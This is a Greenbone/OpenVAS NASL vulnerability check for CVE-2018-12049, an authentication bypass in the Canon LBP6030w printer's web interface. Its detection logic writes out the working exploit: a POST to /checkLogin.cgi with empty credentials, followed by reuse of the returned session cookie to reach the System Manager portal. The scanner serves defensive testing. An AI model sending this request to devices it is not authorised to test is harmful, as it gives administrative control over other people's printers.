# Copyright (C) 2018 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/h:canon:lbp6030w";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.813607");
  script_version("2022-01-24T12:26:02+0000");
  script_tag(name:"last_modification", value:"2022-01-24 12:26:02 +0000 (Mon, 24 Jan 2022)");
  script_tag(name:"creation_date", value:"2018-06-15 12:23:19 +0530 (Fri, 15 Jun 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-08-01 12:11:00 +0000 (Wed, 01 Aug 2018)");

  script_cve_id("CVE-2018-12049");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"Workaround");

  script_name("Canon LBP6030w Authentication Bypass Vulnerability (Jul 2018)");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_canon_printer_consolidation.nasl");
  script_mandatory_keys("canon/printer/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Canon LBP6030w is prone to an authentication bypass
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an improper authentication mechanism for the
  System Manager Mode on the Canon LBP6030w web interface.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to bypass
  the System Manager Mode and get full access to the device.");

  script_tag(name:"affected", value:"Canon Printer LBP6030w.");

  script_tag(name:"solution", value:"The vendor reportedly responded that this issue occurs when a
  customer keeps the default settings without using the countermeasures and best practices shown in
  the documentation.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/44886");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/148162");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

login_data = "iToken=&i0012=1&i0016=";

req = http_post_put_req(port: port, url: "/checkLogin.cgi", data: "iToken=&i0012=1&i0016=",
                        accept_header: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
res = http_keepalive_send_recv(port: port, data: req);

if (egrep(string: res, pattern: "Set-Cookie", icase: TRUE)) {
  cookie_match = eregmatch(string: res, pattern: '[Ss]et-[Cc]ookie: sessid=([^\r\n]+);');
  if (isnull(cookie_match[1]))
    exit(0);

  cookie = cookie_match[1];

  url = "/portal_top.html";

  cookie_header = make_array("Cookie", "sessid=" + cookie);
  req = http_get_req(port: port, url: url, add_headers: cookie_header);
  res = http_keepalive_send_recv(data: req, port: port);

  if ('userName">System&nbsp;Manager' >< res && '>Log Out<' >< res &&
      '>Copyright CANON INC' >< res && res =~ "<title>Remote UI: Portal: LBP6030w.*</title>") {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
